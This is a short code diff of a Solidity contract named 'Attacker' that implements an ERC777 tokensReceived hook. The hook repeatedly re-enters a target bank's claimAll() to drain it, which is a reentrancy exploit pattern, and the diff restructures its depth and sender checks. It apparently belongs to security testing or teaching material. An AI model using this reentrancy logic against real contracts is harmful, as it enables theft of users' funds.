@@ -64,14 +64,10 @@ contract Attacker is AccessControl, IERC777Recipient {
         bytes calldata userData,
         bytes calldata operatorData
     ) external {
-        require(from == address(bank), "Tokens not from target bank");
-        
-        emit Recurse(depth);
-        
-        if (depth < max_depth) {
+        if (from == address(bank) && depth < max_depth) {
             depth++;
+            emit Recurse(depth);
             bank.claimAll();
-            depth--;
         }
     }
 }
